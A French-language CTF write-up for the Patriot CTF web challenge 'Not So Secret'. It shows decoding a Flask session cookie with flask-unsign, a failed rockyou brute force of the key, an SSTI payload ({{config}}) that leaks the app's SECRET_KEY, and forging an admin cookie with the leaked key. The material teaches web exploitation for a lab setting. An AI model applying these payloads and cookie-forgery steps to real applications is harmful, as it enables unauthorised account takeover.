# Patriot CTF

## Web

### Not So Secret

**Difficulté :** Moyen

**Enoncé :** Je suis en train de créer la prochaine grande plateforme de réseaux sociaux, mais j'ai l'habitude de mettre en place des logiciels non sécurisés.

Si vous pouvez vous connecter à l'utilisateur administrateur, je vous donnerai le flag.

Quelqu'un a piraté mon site après que j'ai lu son message, donc je ne lis plus les DM qui me sont envoyés ! > :( 

En plus de cela, j'impose un filtre de caractères spéciaux encore plus sévère parce que je ne sais pas vraiment comment patcher mon code.

p.s. Pour vous faire gagner du temps, n'essayez pas d'obtenir un reverse shell

***

En se connectant au site, on peut apercevoir que le cookie de session est un cookie Flask :

```
.eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q
```

Je commence par décoder le cookie avec **flask-unsign** :

```
flask-unsign --decode --cookie 'eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q'
```

Valeur du cookie :

```
{'_fresh': True, '_id': 'ce350b99da512575db31f09554b543b715ce5fb78e328059262e61bfe3fa713ef11c5021fc5c68bb25fd18f2b6a62a232a33038f6e281fe67147fd53d0aa0827', '_user_id': '2'}
```

On peut constater que la valeur `'_user_id'` est à 2.
Il est fort probable que la valeur 1 soit le compte administrateur.

J'essaye par la suite de bruteforce le cookie par attaque de dictionnaire mais non-concluant :

```
flask-unsign --unsign --cookie ".eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q" --wordlist ~/rockyou.txt --no-lit
eral-eval
```

Il nous manque la clé pour signer notre cookie Flask, je décide donc de regarder côté serveur web pour récupérer cette valeur.

Sur la page d'envois de message, je remarque qu'une faille SSTI (Server Side Template Injection) est exploitable grâce à un simple payload : `{{7*'7'}}`

![image](https://user-images.githubusercontent.com/49941629/166097821-b3fa5a63-abac-40f1-bfe5-00b2e5cae5ab.png)

{{config}}

`Just sent your message: <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:///db.sqlite', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'UPLOAD_FOLDER': '/app/app/uploads', 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>`


`flask-unsign --sign --cookie "{'_fresh': True, '_id': 'ce350b99da512575db31f09554b543b715ce5fb78e328059262e61bfe3fa713ef11c5021fc5c68bb25fd18f2b6a62a232a33038f6e281fe67147fd53d0aa0827', '_user_id': '1'}" --secret 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd'`

`.eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Yfp8AYihLpQ.Ymztig.yz-w4K7dpoOZxHa5NmpqoMF9WPQ`

![image](https://user-images.githubusercontent.com/49941629/166097942-b0536777-d785-4ad4-a6d1-fc605fad6685.png)

![image](https://user-images.githubusercontent.com/49941629/166097953-0f4dcb33-87fe-4fc6-bf3f-efcbc8217dd3.png)
